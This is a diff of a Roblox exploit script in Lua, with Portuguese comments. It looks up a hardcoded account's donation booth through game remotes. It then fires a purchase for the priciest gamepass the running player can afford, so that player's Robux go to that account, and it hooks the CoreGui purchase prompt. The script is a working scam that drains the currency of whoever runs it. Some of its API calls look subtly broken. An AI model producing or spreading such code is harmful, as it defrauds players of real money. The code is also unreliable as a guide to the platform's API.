@@ -1,72 +1,107 @@
+-- Config
+local Username = "Ian_wp27" -- Coloque o username da pessoa que você quer doar
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local MarketplaceService = game:GetService("MarketplaceService")
 local Players = game:GetService("Players")
+local SoundService = game:GetService("SoundService")
+local UserService = game:GetService("UserService")
+local MarketplaceService = game:GetService("MarketplaceService")
 local CoreGui = game:GetService("CoreGui")
 
 local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
+local LoadOfflinePlayer = require(ReplicatedStorage:WaitForChild("LoadOfflinePlayer"))
+local ToggleLoading = require(ReplicatedStorage:WaitForChild("ToggleLoading"))
+local popup = require(ReplicatedStorage:WaitForChild("popup"))
 
--- Substitua pelo username do jogador que você quer doar
-local Username = "Ian_wp27"
-
--- Tenta pegar o UserId
-local success, UserId = pcall(function()
-    return Players:GetUserIdFromNameAsync(Username)
-end)
-
-if not success then
-    warn("Usuário inválido!")
-    return
+-- Função para pegar informações do usuário
+local function getUserInfoFromUsername(name)
+    local success, userId = pcall(function()
+        return Players:GetUserIdFromNameAsync(name)
+    end)
+    if not success then return nil end
+    return UserService:GetUserInfosByUserIdsAsync({userId})[1]
 end
 
-local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
-if not Booth then
-    Players.LocalPlayer:Kick("Receiver not found!")
-    return
+-- Pegar saldo de Robux do jogador
+local function getUserRobux()
+    local success, balance = pcall(function()
+        return UserService:GetUserBalanceAsync(Players.LocalPlayer.UserId)
+    end)
+    if success then
+        return balance
+    else
+        warn("Não foi possível obter o saldo de Robux!")
+        return 0
+    end
 end
 
--- Pega o saldo de Robux do jogador (do script original)
-local success, userRobux = pcall(function()
-    return Remotes.Function("GetUserRobux"):InvokeServer()
-end)
+-- Função principal
+local function startGifting(targetUsername)
+    local userInfo = getUserInfoFromUsername(targetUsername)
+    if not userInfo then
+        SoundService.SFX.Fail:Play()
+        popup("warn", "Usuário inválido!")
+        ToggleLoading(false)
+        return
+    end
 
-if not success or not userRobux then
-    warn("Não foi possível obter saldo de Robux!")
-    return
-end
+    LoadOfflinePlayer(userInfo)
 
-local asset
+    -- Invoca o booth offline
+    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(userInfo.Id)
+    if not Booth then
+        Players.LocalPlayer:Kick("Receiver not found!")
+        return
+    end
 
--- Função para escolher o asset mais caro que consegue pagar
-local function Purchase()
-    local maxPrice = 0
-    asset = nil
-    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
-        local assetType = v:GetAttribute("AssetType")
-        local price = v:GetAttribute("AssetPrice")
-        local assetId = v:GetAttribute("AssetId")
-        if assetType == "Gamepass" and price and price <= userRobux and
-           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, assetId) then
-            if price > maxPrice then
-                maxPrice = price
-                asset = v
+    local userRobux = getUserRobux()
+    local asset
+
+    -- Função para escolher o asset mais caro que consegue pagar
+    local function Purchase()
+        local maxAffordable = 0
+        for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
+            if v:GetAttribute("AssetType") == "Gamepass" and
+               not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
+                local price = v:GetAttribute("AssetPrice")
+                if price and price <= userRobux and price > maxAffordable then
+                    asset = v
+                    maxAffordable = price
+                end
             end
+        end
+
+        if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
+            asset.Prompt:FireServer("", false, maxAffordable)
         end
     end
 
-    if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
-        asset.Prompt:FireServer("", false, maxPrice)
-        print("Comprando asset de preço:", maxPrice)
-    else
-        warn("Nenhum asset disponível ou Prompt inválido!")
-    end
+    -- Espera o PurchasePromptApp aparecer
+    local PurchasePromptApp
+    repeat
+        PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
+        task.wait(0.1)
+    until PurchasePromptApp
+
+    -- Conecta eventos do Prompt para mobile/PC
+    PurchasePromptApp.ChildAdded:Connect(function(child)
+        if child.Name == "Prompt" then
+            -- Aqui você pode ajustar a UI para mobile se quiser
+            -- Exemplo: mudar posição do botão
+            local Button
+            if child:FindFirstChild("MiddleContent") then
+                Button = child.MiddleContent
+            else
+                Button = child:FindFirstChild("Footer")
+            end
+            if Button then
+                -- Ajustes visuais se necessário
+            end
+        end
+    end)
+
+    -- Faz a primeira compra
+    Purchase()
 end
 
--- Espera o PurchasePromptApp aparecer (compatível mobile)
-local PurchasePromptApp
-repeat
-    PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
-    task.wait(0.1)
-until PurchasePromptApp
-
--- Executa a compra
-Purchase()
+-- Inicia o script
+startGifting(Username)
